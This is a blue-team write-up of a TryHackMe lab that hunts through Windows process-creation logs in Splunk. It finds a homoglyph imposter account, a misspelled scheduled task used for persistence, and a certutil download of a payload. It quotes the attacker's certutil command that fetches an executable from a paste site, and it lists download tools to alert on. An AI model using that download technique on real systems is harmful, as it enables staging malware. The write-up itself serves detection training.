---
title: "Benign - LOLBIN Investigation"
date: 2026-03-14
platform: TryHackMe
difficulty: Easy
category: blue-team
summary: "EventID 4688 hunt across an HR workstation: imposter account identification via low-cardinality username analysis, scheduled-task persistence, and a certutil.exe LOLBIN download from controlc.com."
---

## Overview

Benign is an easy TryHackMe blue team room that walks through a **multi-stage investigation in Splunk** using only Windows EventID 4688 (process creation) data. The room teaches a really productive analyst pattern: *look at fields with low natural variety to find the anomaly.*

The investigation surfaces three findings in one event stream: an **imposter user account**, a **scheduled task with a deliberately-misspelled name** used for persistence, and a **certutil.exe LOLBIN abuse** that downloaded a payload.

## Tools Used

- **Splunk** with SPL queries against the `win_eventlogs` index.
- **Windows EventID 4688** (Audit Process Creation) as the sole data source.
- **MITRE ATT&CK** for technique mapping.

## Methodology

**Step 1 - Scope the data.** Time-bounded to March 2022, the index contains roughly 14,000 process-creation events. Small enough to scan fields, large enough that automation matters.

```spl
index="win_eventlogs"
```

**Step 2 - Find the imposter account.** The lab defines 9 legitimate users across IT/HR/Marketing departments. Querying all unique usernames returns 11 values, meaning two accounts are unexpected.

```spl
index="win_eventlogs" 
| stats count by UserName 
| sort + count
```

Sorting by event count ascending puts the *rare* accounts at the top. One value stands out: **Amel1a**. The number 1 replaces the letter *i* in the legitimate *Amelia*. With 1071 events for the real Amelia and only 1 event for the imposter, the low event count is the telltale.

This is a textbook **homoglyph attack** (a phishing/social engineering technique that swaps visually similar characters), and it's how attackers create accounts that look real in logs without alerting a tired analyst.

**Step 3 - Find the persistence mechanism.** Scheduled tasks are a common persistence channel because they survive reboot. Filtering for HR department users running *schtasks.exe*:

```spl
index="win_eventlogs" UserName="Chris.fort" schtasks.exe
```

The command line shows a scheduled task named **OfficUpdater** (note: *OfficUpdater*, not *OfficeUpdater* - the *e* is missing) configured to run *update.exe* from a temp directory at system startup.

The misspelling is the attacker's tell. Real software has consistent spelling. Attackers picking names that *look right* often misspell because they're not the actual developers.

**Step 4 - Find the payload download.** Searching for HTTP-style activity in command lines:

```spl
index="win_eventlogs" (UserName="haroon" OR UserName="Chris.fort" OR UserName="Daina") CommandLine="*http*"
```

A single event surfaces:

```
certutil.exe -urlcache -f - https://controlc.com/<id> benign.exe
```

**certutil.exe** is a legitimate Windows Certificate Services utility used for cert management. The `-urlcache -f` flags force it to fetch a remote URL and cache it locally, effectively turning it into a download tool. This is the textbook **LOLBin** (*living off the land binary*) abuse: a Microsoft-signed binary doing a generic download.

Mapped to MITRE ATT&CK:

- **T1105 - Ingress Tool Transfer** (the download itself).
- **T1218 - System Binary Proxy Execution** (the abuse of a signed binary).

**Step 5 - One event, many answers.** A single certutil event answers the room's questions: which user was compromised (the one running certutil), which date (the event timestamp), which third-party site (controlc.com), which file landed (benign.exe), and the full URL. This is the kind of *load-bearing* event that real investigations turn on.

## Key Takeaways

- **Anomaly hunting beats signature hunting in field-with-low-cardinality data.** Sorting by *count ascending* finds rare values that wouldn't show up in a signature feed.
- **Homoglyph user accounts (Amel1a vs Amelia) are detectable** with username comparisons against the HR directory of legitimate accounts.
- **Scheduled task creation is a high-value EventID to alert on.** *schtasks.exe* + *create* + *running from temp directory* is high-confidence persistence.
- **certutil.exe in any command line containing a URL is high-signal.** There is essentially no legitimate use of certutil as a URL downloader.

## What a Defender Should Do

- Build a baseline of legitimate user accounts and alert on any new account that doesn't match. New account creation (EventID 4720) should require ticket approval to close.
- Build a baseline of legitimate scheduled tasks and alert on any new task. EventID 4698 (scheduled task creation) is the right source.
- Add a high-priority alert on certutil.exe with URL-style arguments. Same for *bitsadmin*, *curl*, *wget*, *Invoke-WebRequest* in service contexts.
- Restrict scheduled task creation to admin groups via Group Policy.
- Forward EventID 4688 with command-line capture to the SIEM from every endpoint. Command-line capture is off by default; enable it via Group Policy (Audit Process Creation: Include command line).
- Maintain a list of known LOLBin abuses (LOLBAS Project) and convert the entries into detection rules.
